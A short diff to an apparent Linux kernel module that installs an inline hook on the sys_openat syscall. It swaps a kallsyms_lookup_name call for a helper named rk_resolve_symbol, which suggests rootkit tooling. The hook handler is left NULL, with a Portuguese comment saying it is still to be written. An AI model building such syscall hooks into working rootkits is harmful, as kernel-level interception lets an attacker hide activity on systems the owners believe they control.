@@ -1,3 +1,4 @@
+#include "memory_utils.h"
 #include "inline_hook.h"
 #include <linux/kernel.h>
 #include <linux/slab.h>
@@ -38,11 +39,10 @@ void remove_inline_hook(struct inline_hook *hook) {
 static struct inline_hook openat_hook;
 
 void setup_inline_hooks(void) {
-    extern void *kallsyms_lookup_name(const char *name);
-    void *target = (void *)kallsyms_lookup_name("sys_openat");
+    unsigned long target = rk_resolve_symbol("sys_openat");
     if (target) {
-        openat_hook.target_func = target;
-        openat_hook.hook_func = NULL;
+        openat_hook.target_func = (void *)target;
+        openat_hook.hook_func = NULL;  // Ajuste aqui quando implementar o handler real
         install_inline_hook(&openat_hook);
     }
 }
